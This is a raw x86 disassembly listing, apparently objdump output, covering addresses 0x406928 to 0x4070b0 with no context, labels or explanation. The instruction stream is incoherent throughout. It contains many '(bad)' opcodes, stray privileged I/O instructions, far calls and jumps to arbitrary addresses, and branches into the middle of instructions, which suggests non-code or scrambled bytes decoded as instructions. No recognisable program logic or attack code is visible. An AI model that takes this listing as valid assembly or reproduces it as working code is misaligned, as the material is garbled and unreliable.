  406928:	call   0x6ebc:0xa60bdb4c
  40692f:	addr16 ret 0xc997
  406933:	cwde   
  406934:	jbe    0x406906
  406936:	std    
  406937:	loopne 0x406944
  406939:	mov    bl,0x43
  40693b:	test   eax,0xcc6e5e5e
  406940:	xchg   esi,eax
  406941:	repz mov al,0x59
  406944:	mov    ds:0x11040e20,eax
  406949:	inc    ebp
  40694a:	dec    edx
  40694b:	les    ebx,FWORD PTR [ecx+0x682a0d14]
  406951:	mov    edi,0xe00d5ceb
  406956:	(bad)  
  406957:	and    al,0xd1
  406959:	xor    ch,BYTE PTR [edx+esi*2]
  40695c:	lods   eax,DWORD PTR ds:[esi]
  40695d:	jns    0x40699b
  40695f:	scas   eax,DWORD PTR es:[edi]
  406960:	scas   al,BYTE PTR es:[edi]
  406961:	add    bl,BYTE PTR [esi]
  406963:	gs push esi
  406965:	ud2    
  406967:	jo     0x406938
  406969:	inc    ebp
  40696a:	stc    
  40696b:	xor    eax,0x3f5b1aaf
  406970:	jl     0x406932
  406972:	mov    ch,0x8f
  406974:	xchg   edx,eax
  406975:	inc    ebx
  406976:	xor    DWORD PTR [ecx],esp
  406978:	pop    edi
  406979:	enter  0x967f,0xae
  40697d:	mov    dl,BYTE PTR [esi+0x35]
  406980:	dec    ebp
  406981:	addr16 in eax,0x4d
  406984:	in     eax,dx
  406985:	aad    0xc2
  406987:	out    dx,al
  406988:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406989:	lahf   
  40698a:	in     eax,dx
  40698b:	gs pfcmpgt mm3,mm6
  406990:	(bad)  
  406991:	sub    esi,esp
  406993:	xchg   BYTE PTR [eax+0x3415087b],al
  406999:	enter  0x424b,0xa
  40699d:	add    BYTE PTR [edx],0xe4
  4069a0:	sub    BYTE PTR [edx-0x4ef0e8db],0xcd
  4069a7:	(bad)  
  4069a8:	jl     0x406a0f
  4069aa:	scas   al,BYTE PTR es:[edi]
  4069ab:	or     DWORD PTR [ebx+0x1c],edx
  4069ae:	daa    
  4069af:	adc    bl,al
  4069b1:	and    esi,esp
  4069b3:	pop    es
  4069b4:	jno    0x4069bd
  4069b6:	adc    ebp,DWORD PTR [ebx+0x1f325bc1]
  4069bc:	and    al,0x82
  4069be:	out    dx,eax
  4069bf:	ret    0xf79a
  4069c2:	mov    ah,0xf5
  4069c4:	ret    
  4069c5:	cwde   
  4069c6:	frstor [ebx+eax*4]
  4069c9:	add    BYTE PTR [ecx+0x7429eff7],bl
  4069cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069d0:	pop    ebp
  4069d1:	xchg   edx,eax
  4069d2:	mov    DWORD PTR [esi-0x1c],esi
  4069d5:	dec    edx
  4069d6:	(bad)  
  4069d7:	or     eax,0x31b018f
  4069dc:	sub    eax,DWORD PTR [edi+edi*1+0x72]
  4069e0:	stos   BYTE PTR es:[edi],al
  4069e1:	call   0xd5e5e19a
  4069e6:	cdq    
  4069e7:	pop    ebp
  4069e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069e9:	pop    esi
  4069ea:	ds inc ebx
  4069ec:	push   cs
  4069ed:	push   0x1b9b604e
  4069f2:	mov    ds:0xf1f2682a,al
  4069f7:	rcr    DWORD PTR [edi-0x30],0xd3
  4069fb:	adc    dh,0x4c
  4069fe:	mov    ah,0x22
  406a00:	pop    ds
  406a01:	mov    ebp,0x6c4481ca
  406a06:	fdivr  QWORD PTR [ecx-0xaf5a2e5]
  406a0c:	test   al,0xe5
  406a0e:	in     eax,0x5a
  406a10:	mov    edi,0x279def8c
  406a15:	xchg   ebx,eax
  406a17:	std    
  406a18:	pop    edx
  406a19:	mov    al,0x50
  406a1b:	mov    bh,BYTE PTR [edx-0x15]
  406a1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a1f:	jecxz  0x406a22
  406a21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a22:	inc    edx
  406a23:	test   eax,0x31930311
  406a28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a29:	jae    0x4069c5
  406a2b:	lds    edx,FWORD PTR [eax+esi*1-0x6c]
  406a2f:	xor    DWORD PTR [ecx+0x3d9dc587],edi
  406a35:	cmp    DWORD PTR [ebp+0x2a],edx
  406a38:	xchg   ebx,eax
  406a39:	outs   dx,BYTE PTR ds:[esi]
  406a3a:	mov    al,ds:0x483514d3
  406a3f:	data16 (bad) 
  406a42:	fistp  QWORD PTR ds:0x2ecc2e6
  406a48:	daa    
  406a49:	mov    cs:0x2a89228f,eax
  406a4f:	div    BYTE PTR [edx+0x68b25d36]
  406a55:	pop    ds
  406a56:	popf   
  406a57:	mov    eax,ds:0xf82d042
  406a5c:	out    0x2a,eax
  406a5e:	and    al,0xc6
  406a60:	mov    edi,0x285701cc
  406a65:	jl     0x406a39
  406a67:	outs   dx,BYTE PTR ds:[esi]
  406a68:	push   esp
  406a69:	sbb    al,BYTE PTR [eax+eax*8]
  406a6c:	sbb    eax,0xd8252126
  406a71:	push   0x7c20a4dc
  406a76:	icebp  
  406a77:	stos   BYTE PTR es:[edi],al
  406a78:	xchg   ebx,eax
  406a79:	add    dl,ch
  406a7b:	popf   
  406a7c:	cdq    
  406a7d:	and    ch,BYTE PTR [ebp+0x1200bec4]
  406a83:	mov    ebx,DWORD PTR [esp+ebx*2+0x6b681c0b]
  406a8a:	mov    dl,BYTE PTR [edx+0x6c]
  406a8d:	xchg   BYTE PTR [ebp+edi*1-0x6fedce36],dl
  406a94:	sub    ch,0xd6
  406a97:	sbb    al,0x6d
  406a99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a9a:	sahf   
  406a9b:	js     0x406a85
  406a9d:	add    BYTE PTR [edx+edi*1],dl
  406aa0:	div    eax
  406aa2:	push   ebp
  406aa3:	fisttp DWORD PTR [edx+ebp*4]
  406aa6:	in     eax,dx
  406aa7:	inc    ebx
  406aa8:	stos   BYTE PTR es:[edi],al
  406aa9:	or     BYTE PTR [edx-0x6d],dl
  406aac:	popf   
  406aad:	pop    eax
  406aae:	stos   DWORD PTR es:[edi],eax
  406aaf:	jp     0x406a37
  406ab1:	xchg   DWORD PTR [ebx],ebx
  406ab3:	enter  0x691c,0xad
  406ab7:	mov    DWORD PTR [ecx+0x3b],edi
  406aba:	xchg   ebp,eax
  406abb:	or     al,0x14
  406abd:	ins    BYTE PTR es:[edi],dx
  406abe:	sub    al,0x9e
  406ac0:	sbb    ecx,esp
  406ac2:	cmp    BYTE PTR [edx+0x6d1836bc],cl
  406ac8:	xchg   edi,eax
  406ac9:	arpl   WORD PTR [ecx+eax*1],si
  406acc:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  406ace:	mov    dh,0x88
  406ad0:	cmp    al,0x80
  406ad2:	loope  0x406a90
  406ad4:	enter  0xfb19,0xd7
  406ad8:	jno    0x406a98
  406ada:	imul   edi,DWORD PTR [edx+0x44],0x6e
  406ade:	in     al,0xfd
  406ae0:	ss (bad) 
  406ae2:	cs (bad) 
  406ae4:	pop    ebx
  406ae5:	notrack call DWORD PTR [ebx-0x4b]
  406ae9:	pop    es
  406aea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406aeb:	ret    0x5f78
  406aee:	jne    0x406b63
  406af0:	mov    ah,0xb
  406af2:	mov    bl,0x87
  406af4:	xchg   ebx,eax
  406af5:	push   ebp
  406af6:	call   0x442a1895
  406afb:	mov    dl,0x9c
  406afd:	adc    ah,dl
  406aff:	test   DWORD PTR [ecx-0x46],esi
  406b02:	psubusw mm2,QWORD PTR [esp+ecx*4+0x2083c4af]
  406b0a:	or     BYTE PTR [esi],0x52
  406b0d:	ins    DWORD PTR es:[edi],dx
  406b0e:	push   ss
  406b0f:	mov    ds:0x1c289524,eax
  406b14:	adc    edx,DWORD PTR [edi-0x544a1b18]
  406b1a:	xchg   ebp,eax
  406b1b:	mov    al,0x53
  406b1d:	mov    edi,0x41fde008
  406b22:	repz int 0x5a
  406b25:	hlt    
  406b26:	adc    eax,0x7908ff36
  406b2b:	lods   eax,DWORD PTR ds:[esi]
  406b2c:	jnp    0x406ad9
  406b2e:	mov    es:0x5c30f6f4,al
  406b34:	sbb    DWORD PTR [edi],ebx
  406b36:	ret    
  406b37:	out    dx,al
  406b38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b39:	mov    esp,0x42883bd7
  406b3e:	or     eax,0x210f7647
  406b43:	test   al,0xf1
  406b45:	or     al,0x11
  406b47:	loop   0x406b5b
  406b49:	bound  esi,QWORD PTR [esi+0x2b]
  406b4c:	pop    ss
  406b4d:	add    BYTE PTR [esi+0x19],0xdc
  406b51:	out    dx,eax
  406b52:	xor    DWORD PTR [edx+ecx*4],ebx
  406b55:	jo     0x406b3b
  406b57:	jbe    0x406ad9
  406b59:	dec    esi
  406b5a:	ins    DWORD PTR es:[edi],dx
  406b5b:	fstp   DWORD PTR [ecx]
  406b5d:	fiadd  DWORD PTR ds:0xe51df1d6
  406b63:	(bad)  
  406b64:	in     al,0x7c
  406b66:	jl     0x406b6d
  406b68:	into   
  406b69:	inc    esp
  406b6a:	mov    dh,0xf8
  406b6c:	int3   
  406b6d:	add    eax,0xf7580d7d
  406b72:	push   eax
  406b73:	pop    esp
  406b74:	adc    edx,0xfffffff0
  406b77:	xor    BYTE PTR [ecx],bl
  406b79:	sti    
  406b7a:	add    dl,al
  406b7c:	push   ds
  406b7d:	or     bh,BYTE PTR [edi+edi*8+0x6b]
  406b81:	rol    DWORD PTR [ecx],1
  406b83:	adc    BYTE PTR [ecx+esi*2-0x37],ah
  406b87:	leave  
  406b88:	mov    bh,0x65
  406b8a:	lods   eax,DWORD PTR ds:[esi]
  406b8b:	imul   edx,DWORD PTR [ebx],0x6ff89819
  406b91:	imul   edi,DWORD PTR [eax+0x58c7a776],0xffffffaa
  406b98:	cmp    al,0x87
  406b9a:	(bad)  
  406b9b:	lahf   
  406b9c:	mov    al,ds:0xb164f5a1
  406ba1:	push   edi
  406ba2:	cmp    BYTE PTR [ecx],dh
  406ba4:	ret    0x75a1
  406ba7:	in     al,0xb7
  406ba9:	adc    BYTE PTR [ebp-0x620d9f6],cl
  406baf:	adc    DWORD PTR [ebp+0x71d29c8],ebx
  406bb5:	xor    al,0xfa
  406bb7:	gs gs (bad) 
  406bbb:	jae    0x406b4f
  406bbd:	and    eax,DWORD PTR [edi]
  406bbf:	xor    eax,eax
  406bc1:	sub    BYTE PTR [esi+0x3d39e69b],ch
  406bc7:	scas   al,BYTE PTR es:[edi]
  406bc8:	shr    BYTE PTR [edx-0x4ebce1c3],0x8a
  406bcf:	and    BYTE PTR [edi+ebp*1-0x54],dh
  406bd3:	fist   DWORD PTR [esi]
  406bd5:	inc    ebp
  406bd6:	pop    ss
  406bd7:	pop    edi
  406bd8:	not    eax
  406bda:	xor    BYTE PTR [ebx+0x2f9bd262],ch
  406be0:	(bad)  
  406be2:	push   ds
  406be3:	adc    ecx,DWORD PTR [edx]
  406be5:	lods   eax,DWORD PTR ds:[esi]
  406be6:	and    al,0x77
  406be8:	cli    
  406be9:	mov    dh,0x57
  406beb:	cmp    bh,BYTE PTR [ecx+0x70ead1d1]
  406bf1:	mov    edx,0x177777e2
  406bf6:	(bad)  
  406bf7:	nop
  406bf8:	shl    DWORD PTR [edx-0x5b9f5956],cl
  406bfe:	sub    bh,BYTE PTR [edx]
  406c00:	imul   dl
  406c02:	mov    dh,0x21
  406c04:	sahf   
  406c05:	ss aaa 
  406c07:	mov    al,0x21
  406c09:	push   es
  406c0a:	mov    ecx,edi
  406c0c:	ja     0x406bc4
  406c0e:	rcl    BYTE PTR [edi],1
  406c10:	(bad)  
  406c11:	xlat   BYTE PTR ds:[ebx]
  406c12:	sbb    bl,BYTE PTR [edx+ebx*4]
  406c15:	stos   DWORD PTR es:[edi],eax
  406c16:	adc    BYTE PTR [ebp-0x6f],al
  406c19:	dec    esi
  406c1a:	mov    esp,DWORD PTR [ecx]
  406c1c:	pop    ebp
  406c1d:	fisub  DWORD PTR [ebx]
  406c1f:	fdiv   QWORD PTR [ecx+0x22ff09a7]
  406c25:	dec    esi
  406c26:	push   cs
  406c27:	(bad)  
  406c28:	adc    dh,BYTE PTR [ebp+0xf]
  406c2b:	ins    DWORD PTR es:[edi],dx
  406c2c:	outs   dx,DWORD PTR ds:[esi]
  406c2d:	(bad)  
  406c30:	aas    
  406c31:	push   ebx
  406c32:	mov    eax,0xda5e64e8
  406c37:	(bad)  
  406c39:	into   
  406c3a:	pusha  
  406c3b:	or     eax,0xc6e4f239
  406c40:	sbb    eax,DWORD PTR [esi]
  406c42:	scas   al,BYTE PTR es:[edi]
  406c43:	jmp    0x406bf5
  406c45:	sbb    ch,dl
  406c47:	cmp    BYTE PTR [esi+ebx*8-0x5c590743],bh
  406c4e:	cmc    
  406c4f:	lods   eax,DWORD PTR ds:[esi]
  406c50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c51:	push   edi
  406c52:	daa    
  406c53:	sar    BYTE PTR ds:0x85c47ab8,0x75
  406c5a:	loopne 0x406c91
  406c5c:	aad    0x88
  406c5e:	ror    BYTE PTR [ebx-0x4e],1
  406c61:	imul   si
  406c64:	and    ch,al
  406c66:	adc    DWORD PTR [ebx-0x27],0x5a
  406c6a:	inc    esp
  406c6b:	ins    BYTE PTR es:[edi],dx
  406c6c:	and    cl,BYTE PTR [esi+0x4f007bab]
  406c72:	and    dh,dl
  406c74:	ins    BYTE PTR es:[edi],dx
  406c75:	popa   
  406c76:	adc    BYTE PTR [ecx],bl
  406c78:	cld    
  406c79:	stos   DWORD PTR es:[edi],eax
  406c7a:	and    DWORD PTR [edi-0x5d],esp
  406c7d:	jbe    0x406c2e
  406c7f:	ret    
  406c80:	sbb    bl,bl
  406c82:	pop    ebp
  406c83:	jg     0x406cd1
  406c85:	adc    DWORD PTR [esp+ebx*8+0x19],0xfffffff4
  406c8a:	std    
  406c8b:	and    eax,0x80669258
  406c90:	outs   dx,DWORD PTR ds:[esi]
  406c91:	rol    bh,0xe2
  406c94:	dec    ecx
  406c95:	in     eax,0x98
  406c97:	push   ebx
  406c98:	push   ebx
  406c99:	jmp    0x981e:0x767af40d
  406ca0:	div    bl
  406ca2:	cwde   
  406ca3:	lds    esi,FWORD PTR [ebx+0x1753f2cd]
  406ca9:	jo     0x406cfb
  406cab:	data16 aad 0x87
  406cae:	scas   al,BYTE PTR es:[edi]
  406caf:	test   al,0xf3
  406cb1:	push   0xffffffc8
  406cb3:	mov    esi,0xacdd8a97
  406cb8:	adc    al,0x32
  406cba:	cwde   
  406cbb:	xor    DWORD PTR [ecx+ecx*4+0x74de1ec9],edx
  406cc2:	mov    bh,0x3
  406cc4:	mov    ds,WORD PTR [ebp*8+0x3bb6e1a8]
  406ccb:	loopne 0x406c7d
  406ccd:	call   0x9cf8f9ea
  406cd2:	push   eax
  406cd3:	fld    st(6)
  406cd5:	loopne 0x406d0d
  406cd7:	push   ebp
  406cd8:	lock cmp eax,0x9fd61f7
  406cde:	adc    DWORD PTR [eax+0x61],esp
  406ce1:	mov    bh,0xe2
  406ce3:	or     eax,0x374a1eb1
  406ce8:	mov    DWORD PTR [edi+ebp*1],esp
  406ceb:	cwde   
  406cec:	sub    BYTE PTR [ebx+edx*2],cl
  406cef:	mov    ebx,ebx
  406cf1:	(bad)  
  406cf2:	cmc    
  406cf3:	dec    edi
  406cf4:	out    dx,eax
  406cf5:	pop    ds
  406cf6:	push   0x17
  406cf8:	dec    ebp
  406cf9:	dec    esp
  406cfa:	or     al,0x91
  406cfc:	ffreep st(1)
  406cfe:	jecxz  0x406cdb
  406d00:	test   DWORD PTR [ebx+ebx*4],eax
  406d03:	outs   dx,DWORD PTR ds:[esi]
  406d04:	imul   edi,DWORD PTR [ecx+0x2eb43acb],0x44b548ca
  406d0e:	push   cs
  406d0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d10:	jmp    0x45ad4065
  406d15:	in     eax,dx
  406d16:	pushf  
  406d17:	out    0xf1,al
  406d19:	sbb    ah,BYTE PTR [ebp+0x4353980c]
  406d1f:	(bad)  
  406d20:	lock dec edi
  406d22:	push   ecx
  406d23:	stos   BYTE PTR es:[edi],al
  406d24:	sbb    eax,DWORD PTR [ebx+edx*1+0x14]
  406d28:	or     DWORD PTR [edx+0x35],ebx
  406d2b:	push   cs
  406d2c:	nop
  406d2d:	(bad)  
  406d2e:	vpaddw xmm1,xmm2,XMMWORD PTR [esi-0x56]
  406d33:	jecxz  0x406d55
  406d35:	mov    eax,ds:0xa1b78c3e
  406d3a:	cmp    dl,bl
  406d3c:	mov    dl,0xfb
  406d3e:	je     0x406cd4
  406d40:	xchg   ecx,eax
  406d41:	and    eax,0x18ad2d35
  406d46:	add    al,0x6a
  406d48:	mov    DWORD PTR [ebx-0x5e1dc338],esi
  406d4e:	pop    es
  406d4f:	addr16 sub eax,0xd0f643cd
  406d55:	dec    esi
  406d56:	add    eax,0x2233ef6b
  406d5b:	mov    ch,0x43
  406d5d:	clc    
  406d5e:	jns    0x406db8
  406d60:	or     BYTE PTR [ecx-0x41c9dea6],ah
  406d66:	lods   al,BYTE PTR ds:[esi]
  406d67:	push   eax
  406d68:	push   0x39ebb01d
  406d6d:	dec    ecx
  406d6e:	mov    bl,0x63
  406d70:	jg     0x406d80
  406d72:	jo     0x406dae
  406d74:	popa   
  406d75:	je     0x406dd5
  406d77:	dec    ecx
  406d78:	push   edi
  406d79:	shl    DWORD PTR [edi-0x588821c6],cl
  406d7f:	mov    WORD PTR [ecx],ss
  406d81:	int3   
  406d82:	ds ins BYTE PTR es:[edi],dx
  406d84:	fiadd  WORD PTR [ebx-0x722837de]
  406d8a:	ror    BYTE PTR [ecx+0x40],cl
  406d8d:	loop   0x406d6d
  406d8f:	or     BYTE PTR [edx+0x1d2de2de],0xf0
  406d96:	push   edx
  406d97:	and    esp,DWORD PTR [esi-0x1d19fe39]
  406d9d:	pushf  
  406d9e:	dec    ebx
  406d9f:	sti    
  406da0:	sbb    DWORD PTR [eax+0x7941bec3],ebx
  406da6:	dec    edi
  406da7:	sub    ebp,DWORD PTR [edi+ebx*8+0x34]
  406dab:	add    al,cl
  406dad:	push   eax
  406dae:	mov    ecx,0x306f4739
  406db3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406db4:	sub    edx,DWORD PTR [ebp-0x5b]
  406db7:	cld    
  406db8:	lea    edx,[ecx-0x6a6f1ad1]
  406dbe:	xor    bl,dh
  406dc0:	lods   eax,DWORD PTR ds:[esi]
  406dc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dc2:	adc    DWORD PTR [eax+0x45c42091],eax
  406dc8:	gs das 
  406dca:	outs   dx,BYTE PTR ds:[esi]
  406dcb:	jge    0x406d71
  406dcd:	add    DWORD PTR [ebx+0x33359890],ebx
  406dd3:	dec    ecx
  406dd4:	sbb    DWORD PTR [eax-0x2f],0x3866a7bc
  406ddb:	cmp    al,0x93
  406ddd:	xchg   esi,eax
  406dde:	iret   
  406ddf:	mov    esp,0xc13f7dee
  406de4:	ja     0x406e12
  406de6:	mov    ecx,0x4128de8a
  406deb:	dec    ecx
  406dec:	outs   dx,BYTE PTR ds:[esi]
  406ded:	jmp    0x2ff4ee13
  406df2:	pop    ebx
  406df3:	dec    esp
  406df4:	loop   0x406dd1
  406df6:	dec    esp
  406df7:	(bad)  
  406df8:	(bad)  
  406df9:	dec    ebp
  406dfa:	adc    DWORD PTR [eax],edi
  406dfc:	lock xor esp,DWORD PTR ds:0xcb77c954
  406e03:	aad    0x4a
  406e05:	loopne 0x406dea
  406e07:	nop
  406e08:	scas   eax,DWORD PTR es:[edi]
  406e09:	repnz mov ecx,0x9acb0acf
  406e0f:	outs   dx,BYTE PTR ds:[esi]
  406e10:	rol    DWORD PTR ds:[ecx-0x5a],0x32
  406e15:	pop    ds
  406e16:	sbb    al,0x22
  406e18:	in     eax,0x7
  406e1a:	popf   
  406e1b:	mov    dh,0xdb
  406e1d:	dec    ecx
  406e1e:	mov    ecx,0x920897a
  406e23:	inc    edx
  406e24:	pop    eax
  406e25:	pop    ss
  406e26:	and    al,0x34
  406e28:	mov    ecx,0x8d7b3661
  406e2d:	mov    esi,0x8c474224
  406e32:	imul   edi,DWORD PTR [esi+0x56],0x7bd7bec9
  406e39:	xchg   ebx,eax
  406e3a:	test   eax,0xa327f087
  406e3f:	int    0x2d
  406e41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e42:	loopne 0x406ea7
  406e44:	jno    0x406e30
  406e46:	ror    BYTE PTR [ecx+ecx*2],cl
  406e49:	inc    ebp
  406e4a:	outs   dx,BYTE PTR ds:[esi]
  406e4b:	lahf   
  406e4c:	inc    esi
  406e4d:	and    al,0x7e
  406e4f:	js     0x406e09
  406e51:	dec    eax
  406e52:	xor    cl,bl
  406e54:	sahf   
  406e55:	mov    ds:0x5b38a1bc,eax
  406e5a:	in     eax,0x74
  406e5c:	pop    edx
  406e5d:	dec    esp
  406e5e:	jno    0x406e72
  406e60:	call   0xdd75531a
  406e65:	xchg   ebx,eax
  406e66:	adc    BYTE PTR [ebp-0x4e],ch
  406e69:	test   WORD PTR [ecx+0x70956866],0x5a25
  406e72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e73:	pop    ebx
  406e74:	aas    
  406e75:	jae    0x406e75
  406e77:	test   DWORD PTR [ecx],ecx
  406e79:	and    DWORD PTR [ecx-0x78],ebx
  406e7c:	sub    DWORD PTR [ebp+0x4269d7c6],eax
  406e82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e83:	imul   ebp,DWORD PTR [ecx-0x2889fd06],0x42fa2212
  406e8d:	sub    dh,bh
  406e8f:	imul   ebp,ebp,0xdcf7e84e
  406e95:	push   0xffffffc9
  406e97:	jmp    0x777a106b
  406e9c:	xor    DWORD PTR [edx],esp
  406e9e:	not    DWORD PTR [esi+edx*1-0x196cfc77]
  406ea5:	pop    edi
  406ea6:	pushf  
  406ea7:	lock in al,0x3d
  406eaa:	(bad)  
  406eab:	scas   eax,DWORD PTR es:[edi]
  406eac:	call   0xd996d7ae
  406eb1:	imul   edi,DWORD PTR [edx],0x87297555
  406eb7:	bound  esi,QWORD PTR [esi+eiz*4]
  406eba:	fs mov edx,0x1090c121
  406ec0:	add    BYTE PTR [edi-0x199674b7],bl
  406ec6:	ret    
  406ec7:	or     esi,DWORD PTR [edi+0x4]
  406eca:	jbe    0x406ed2
  406ecc:	dec    ecx
  406ecd:	sub    esi,edi
  406ecf:	cs xor eax,0xbd2b2ea6
  406ed5:	add    al,0x8a
  406ed7:	xor    eax,esp
  406ed9:	test   eax,0xe7641340
  406ede:	inc    ebx
  406edf:	out    dx,eax
  406ee0:	xor    eax,0xc5b81280
  406ee5:	ret    0xc9e4
  406ee8:	bound  ecx,QWORD PTR [edx-0x10]
  406eeb:	into   
  406eec:	or     DWORD PTR [ebx-0x65],ecx
  406eef:	sbb    edi,0x38f3a090
  406ef5:	and    ah,BYTE PTR [ebp+0x7]
  406ef8:	cli    
  406ef9:	mov    ds:0xa6df7ac,al
  406efe:	adc    BYTE PTR [ecx+0x51118c8c],bh
  406f04:	iret   
  406f05:	loop   0x406f2e
  406f07:	fiadd  DWORD PTR [edi-0x45]
  406f0a:	(bad)  
  406f0b:	(bad)  
  406f0c:	and    DWORD PTR [esi-0x1c],ebp
  406f0f:	mov    es,WORD PTR [ecx+0x3ca074ed]
  406f15:	jbe    0x406f01
  406f17:	mov    cl,cl
  406f19:	or     DWORD PTR [ecx+0x6d52a489],ecx
  406f1f:	or     BYTE PTR [edi+0x57],bl
  406f22:	and    al,0x8a
  406f24:	adc    al,bl
  406f26:	dec    esp
  406f27:	adc    bh,BYTE PTR [ebx]
  406f29:	or     BYTE PTR [edx+0x3c0e46c5],al
  406f2f:	(bad)  [eax+0x6ab9de12]
  406f35:	test   DWORD PTR [ecx],esp
  406f37:	retf   
  406f38:	call   0xfbf950dd
  406f3d:	xchg   ebx,eax
  406f3e:	push   es
  406f3f:	add    DWORD PTR [edi+0x3170fb98],ebx
  406f45:	test   DWORD PTR [ebx-0x5a],ebx
  406f48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f49:	outs   dx,DWORD PTR ds:[esi]
  406f4a:	repz jbe 0x406f1c
  406f4d:	ins    DWORD PTR es:[edi],dx
  406f4e:	xor    dl,dh
  406f50:	xor    eax,0xc4dce955
  406f55:	mov    ?,WORD PTR [edi-0x55]
  406f58:	test   eax,0x440f227c
  406f5d:	mov    al,0xff
  406f5f:	jmp    0x85815117
  406f64:	test   DWORD PTR [edx-0x3fb8db61],ebx
  406f6a:	pop    eax
  406f6b:	pop    esi
  406f6c:	shl    ah,0x85
  406f6f:	push   ebx
  406f70:	push   esi
  406f71:	fidivr DWORD PTR [eax+0x20137dda]
  406f77:	mov    ebp,0x4a2e465f
  406f7c:	jl     0x406f00
  406f7e:	push   ecx
  406f7f:	or     al,0xef
  406f81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f82:	sub    edi,DWORD PTR [edi+0x8]
  406f85:	pop    ds
  406f86:	jg     0x406f96
  406f88:	out    dx,eax
  406f89:	mov    cs,WORD PTR [ebx+0x62]
  406f8c:	call   0x7014:0xbf31b07a
  406f93:	daa    
  406f94:	add    eax,0x8b28488c
  406f99:	and    DWORD PTR [ebp-0x1f],esi
  406f9c:	adc    BYTE PTR [eax-0x4e],dh
  406f9f:	das    
  406fa0:	xlat   BYTE PTR ds:[ebx]
  406fa1:	or     esi,DWORD PTR [edi]
  406fa3:	(bad)  
  406fa4:	in     eax,0x52
  406fa6:	sti    
  406fa7:	xor    DWORD PTR [ecx+0x28a6aff8],edi
  406fad:	fs mov bh,0xfc
  406fb0:	call   0xa20a37fe
  406fb5:	push   edi
  406fb6:	jne    0x40702b
  406fb8:	fnstcw WORD PTR [esi+edi*2-0x114da77b]
  406fbf:	dec    esi
  406fc0:	fsubr  QWORD PTR [ebx-0x14]
  406fc3:	adc    eax,0xf56388b2
  406fc8:	retf   
  406fc9:	xchg   ebx,eax
  406fca:	(bad)  [ebx-0x6d]
  406fcd:	stos   BYTE PTR es:[edi],al
  406fce:	ret    0x19a3
  406fd1:	lds    edx,FWORD PTR [esi]
  406fd3:	jns    0x406fe5
  406fd5:	outs   dx,DWORD PTR ds:[esi]
  406fd6:	cld    
  406fd7:	ret    
  406fd8:	xchg   ah,ah
  406fda:	(bad)  
  406fdb:	xchg   esi,eax
  406fdc:	xchg   ebx,eax
  406fdd:	push   0x8da4e040
  406fe2:	dec    esi
  406fe3:	inc    ebx
  406fe4:	push   ecx
  406fe5:	je     0x406f8e
  406fe7:	clc    
  406fe8:	mov    edi,0xacdebb7b
  406fed:	jg     0x407005
  406fef:	or     al,0x69
  406ff1:	add    cl,bl
  406ff3:	add    al,0x26
  406ff5:	daa    
  406ff6:	or     DWORD PTR [edi+edx*1+0x1e16c236],0xfffffff4
  406ffe:	pushf  
  406fff:	inc    esi
  407000:	fs popf 
  407002:	xor    bh,BYTE PTR [eax]
  407004:	scas   al,BYTE PTR es:[edi]
  407005:	push   cs
  407006:	out    0xc,eax
  407008:	sbb    ch,BYTE PTR [eax-0x65]
  40700b:	mov    esp,0x55b386b
  407010:	aam    0xcd
  407012:	call   0x1228ff2
  407017:	js     0x40703b
  407019:	enter  0x7382,0xc3
  40701d:	call   0x36eb:0xe2616bfc
  407024:	test   al,0x56
  407026:	add    DWORD PTR ds:0x70b0baff,esi
  40702c:	add    eax,0x613f8998
  407031:	jg     0x40708d
  407033:	mov    esp,0xec582f3e
  407038:	sub    dh,BYTE PTR [ebp-0x6f]
  40703b:	push   ecx
  40703c:	sbb    DWORD PTR [ecx+esi*1+0x4cefcbdb],eax
  407043:	out    dx,al
  407044:	js     0x4070a8
  407046:	add    bh,BYTE PTR [esi-0x6]
  407049:	push   eax
  40704a:	or     dh,BYTE PTR [ebx]
  40704c:	add    al,BYTE PTR [eax+0x4d74368b]
  407052:	mov    ds:0x867bb907,al
  407057:	std    
  407058:	(bad)  
  407059:	data16 mov dl,cl
  40705c:	jmp    0x5071:0x88dde0cf
  407063:	lods   eax,DWORD PTR ds:[esi]
  407064:	repnz imul ebp,DWORD PTR [esi+0x7b773dbd],0x5b
  40706c:	xchg   ebx,eax
  40706d:	cmp    eax,0x7235a082
  407072:	mov    ch,0x87
  407074:	and    al,0xdb
  407076:	cmc    
  407077:	dec    ebx
  407078:	dec    ecx
  407079:	in     al,0x7
  40707b:	jb     0x407030
  40707d:	les    esi,FWORD PTR [eax-0x2a]
  407080:	lods   eax,DWORD PTR ds:[esi]
  407081:	nop
  407082:	pusha  
  407083:	mov    al,0xd5
  407085:	push   cs
  407086:	add    DWORD PTR [eax+0x36],edi
  407089:	(bad)  
  40708a:	sbb    BYTE PTR [edx-0x24],dl
  40708d:	adc    BYTE PTR [ecx],ch
  40708f:	outs   dx,DWORD PTR ds:[esi]
  407090:	ja     0x40708f
  407092:	and    esi,DWORD PTR [eax]
  407094:	cld    
  407095:	xor    al,0x61
  407097:	ins    BYTE PTR es:[edi],dx
  407098:	add    DWORD PTR [ebx],edi
  40709a:	xchg   esi,eax
  40709b:	and    DWORD PTR [esi],edi
  40709d:	inc    edi
  40709e:	dec    edx
  40709f:	dec    esi
  4070a0:	and    al,0x8a
  4070a2:	xor    al,0x5c
  4070a4:	int3   
  4070a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070a6:	les    edi,FWORD PTR [esi]
  4070a8:	data16 ror BYTE PTR [eax-0x59078d92],0x60
  4070b0:	popf   
